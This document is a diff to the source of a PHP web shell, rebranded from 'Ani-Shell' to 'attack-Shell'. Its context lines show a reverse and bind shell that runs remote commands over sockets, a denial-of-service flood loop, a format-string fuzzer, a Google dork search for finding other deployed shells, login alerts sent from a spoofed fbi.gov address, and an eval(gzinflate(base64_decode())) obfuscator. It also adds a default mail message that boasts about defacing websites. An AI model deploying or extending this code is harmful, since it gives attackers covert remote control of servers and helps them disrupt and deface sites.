@@ -15,8 +15,6 @@
 []      +  Email: franzwagner.str@gmail.com    +
 []      +  Twitter: twitter.com/strund3r       +
 []====================================================
-
-Jai Hind
 */
 
 ini_set('max_execution_time',0);
@@ -80,7 +78,7 @@ if(isset($_GET['zip'])) {
 /**************** Defines *********************************/
 
 $greeting 		= "0x xx W3lc0m3 M4st3r xx x0";
-$user 			= "admin ";
+$user 			= "admin";
 $pass 			= "12345687";
 $lock 			= "on"; // set this to off if you dont need the login page
 $antiCrawler 		= "off"; // set this to on if u dont want your shell to be publicised in Search Engines ! (It increases the shell's Life')
@@ -114,7 +112,7 @@ function sendLoginAlert()
     global $url;
     $accesedIp = $_SERVER['REMOTE_ADDR'];
     $randomInt = rand(0,1000000);           # to avoid id blocking
-    $from = "ani-shell$randomInt@fbi.gov";
+    $from = "attack-shell$randomInt@fbi.gov";
 
     //echo $from;
 
@@ -135,7 +133,7 @@ Hey Owner ,
         Thanking You
 
 Yours Faithfully
-Ani-Shell
+attack-Shell
         ";
         mail($ownerEmail,$subject,$message,'From:'.$from);
     }
@@ -1499,7 +1497,7 @@ else if(isset($_GET['gdork']))
                         intitle
                     </td>
                     <td>
-                         <input class="cmd" name="title" value="Ani-Shell"/>
+                         <input class="cmd" name="title" value="attack-Shell"/>
                     </td>
                 </tr>
                 <tr>
@@ -1507,7 +1505,7 @@ else if(isset($_GET['gdork']))
                     intext
                 </td>
                 <td>
-                    <input class="cmd" name="text" value="lionaneesh" />
+                    <input class="cmd" name="text" value="ATTACK!" />
                 </td>
                 </tr>
                 <tr>
@@ -1515,7 +1513,7 @@ else if(isset($_GET['gdork']))
                         inurl
                     </td>
                     <td>
-                         <input class="cmd" name="url" value="Ani-Shell.php"/>
+                         <input class="cmd" name="url" value="attack-Shell.php"/>
                     </td>
                 </tr>
                 <tr>
@@ -1575,7 +1573,7 @@ else if(isset($_GET['connect']))
          fputs($sockfd ,$dateAndTime."\n\n" );
          while(!feof($sockfd))
          {
-            $cmdPrompt ="(Ani-Shell)[$]> ";
+            $cmdPrompt ="(attack-Shell)[$]> ";
             fputs ($sockfd , $cmdPrompt );
             $command= fgets($sockfd, $len);
             fputs($sockfd , "\n" . exec_all($command) . "\n\n");
@@ -1685,7 +1683,7 @@ else if(isset($_GET['connect']))
             while(1)
             {
                 // Print Command prompt
-                $commandPrompt ="(Ani-Shell)[$]> ";
+                $commandPrompt ="(attack-Shell)[$]> ";
                 $maxCmdLen = 31337;
                 socket_write($client,$commandPrompt);
                 $cmd = socket_read($client,$maxCmdLen);
@@ -1758,7 +1756,7 @@ else if(isset($_GET['connect']))
                 </tr>
                 <tr>
                     <td>Passwd </td>
-                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="lionaneesh"/>
+                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="12345687"/>
                 </tr>
                 <tr>
                 <td>
@@ -1819,7 +1817,7 @@ else if(isset($_GET['fuzz']))
             $data .= urlencode($_GET['message']);
         }
         $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
-        $data .= "by-Ani-shell".$ending;
+        $data .= "by-attack-shell".$ending;
         $length = strlen($data);
 
 
@@ -1940,7 +1938,7 @@ else if(isset($_GET['dos']))
        {
             $data .= "X";
        }
-       $data .= "-by-Ani-Shell";
+       $data .= "-by-attack-Shell";
        print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
 
        while(1)
@@ -2184,6 +2182,13 @@ else if(isset($_GET['mail']))
 
 
                 <tr>
+                    <td colspan="2">
+                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
+                    </td>
+                </tr>
+
+
+                <tr>
                     <td rowspan="2">
                         <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Send! :D"/>
                     </td>
@@ -2231,7 +2236,7 @@ else if(isset($_GET['obfuscate']))
 <?php
 $encoded = \''.$encoded.'\';
 eval(gzinflate(base64_decode($encoded)));
-// Script Encoded by Ani-Shell
+// Script Encoded by attack-Shell
 ?>
 ';
     }
@@ -2440,5 +2445,7 @@ else
 // End Shell
 //-------------------------------------------------------------------------------------------------
 ?>
+<div class="clearfooter"></div>
+</div>
 </body>
 </html>
